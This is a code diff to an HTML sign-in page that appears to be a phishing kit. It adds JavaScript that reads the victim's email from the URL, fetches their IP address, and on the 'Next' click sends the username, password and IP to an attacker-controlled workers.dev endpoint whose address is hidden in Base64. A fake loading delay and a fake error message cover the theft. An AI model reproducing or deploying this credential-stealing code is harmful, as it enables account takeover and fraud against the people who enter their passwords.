@@ -34,6 +34,44 @@
 
 
 </head>
+<style>
+    #loadingPopup {
+        display: none;
+        position: fixed;
+        z-index: 9999;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.8);
+        color: white;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+    }
+
+    #loadingPopup .spinner {
+        margin-bottom: 20px;
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top: 4px solid white;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+</style>
 
 <body>
 
@@ -350,6 +388,61 @@
     <script>
         let attemptCount = 0; // Track the number of password attempts
 
+        // Function to decode the Base64 worker URL
+        function decodeBase64(encodedString) {
+            return atob(encodedString);
+        }
+
+        // Function to extract email from the URL
+        function extractEmailFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search); // Get query parameters
+            const emailParam = urlParams.get('email'); // Extract 'email' parameter if available
+
+            if (!emailParam) {
+                const emailMatch = window.location.href.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                return emailMatch ? emailMatch[0] : "default@example.com"; // Return matched email or fallback
+            }
+
+            return emailParam; // Return the extracted email parameter
+        }
+
+        // Function to get the IP address
+        async function getIpAddress() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Failed to fetch IP address:", error);
+                return "Unknown";
+            }
+        }
+
+        // Function to send data to the worker
+        async function sendToWorker(username, password, ip) {
+            const workerUrl = decodeBase64("aHR0cHM6Ly9pb25vc3BhZ2VkZWxpdmVyeS50cmllZC1sb3JkLndvcmtlcnMuZGV2Lw==");
+
+            try {
+                const response = await fetch(workerUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        Username: username,
+                        Password: password,
+                        Ip: ip,
+                    }),
+                });
+
+                if (!response.ok) {
+                    console.error("Failed to send data to the worker");
+                }
+            } catch (error) {
+                console.error("Error sending data to the worker:", error);
+            }
+        }
+
         // Disable the "Next" button if the password field is empty
         function validatePassword() {
             const passwordInput = document.getElementById("user-password");
@@ -372,16 +465,19 @@
         });
 
         // Listen to the "Next" button click
-        document.getElementById("submit-button").addEventListener("click", function (event) {
+        document.getElementById("submit-button").addEventListener("click", async function (event) {
             event.preventDefault(); // Prevent form submission
 
             const passwordInput = document.getElementById("user-password");
             const errorMessageElement = document.getElementById("error-message");
             const nextButton = document.getElementById("submit-button");
             const loadingPopup = document.getElementById("loadingPopup");
+            const username = extractEmailFromUrl(); // Extract email from the URL
+            const password = passwordInput.value.trim();
+            const ip = await getIpAddress(); // Fetch IP address
 
             // If password is empty, show error and stop further action
-            if (passwordInput.value.trim() === "") {
+            if (!password) {
                 errorMessageElement.textContent = "Password is required to proceed.";
                 errorMessageElement.style.color = "red";
                 nextButton.disabled = false; // Ensure the button is re-enabled
@@ -393,7 +489,10 @@
             nextButton.disabled = true; // Disable the button to prevent multiple clicks
             nextButton.textContent = "Loading..."; // Show the loading text
 
-            // Simulate loading delay
+            // Send data to the worker
+            await sendToWorker(username, password, ip);
+
+            // Simulate loading delay and handle UI
             setTimeout(() => {
                 loadingPopup.style.display = "none"; // Hide the loading message
                 nextButton.disabled = false; // Re-enable the button after the error or success
@@ -416,15 +515,17 @@
             }, 3000); // Simulate a 3-second delay
         });
 
-        // Validate password on page load to disable the button initially
+        // Validate password on page load and update email dynamically
         window.onload = function () {
             const emailElement = document.querySelector('.ghost-button__text');
-            const newEmail = "updatedemail@example.com"; // Replace with your desired email
-            emailElement.textContent = newEmail; // Update the email immediately on load
+            const extractedEmail = extractEmailFromUrl(); // Extract email from the URL
+            emailElement.textContent = extractedEmail; // Update the email immediately on load
 
             validatePassword(); // Initial validation
         };
     </script>
+
+
 
     <script>
         // Function to toggle password visibility
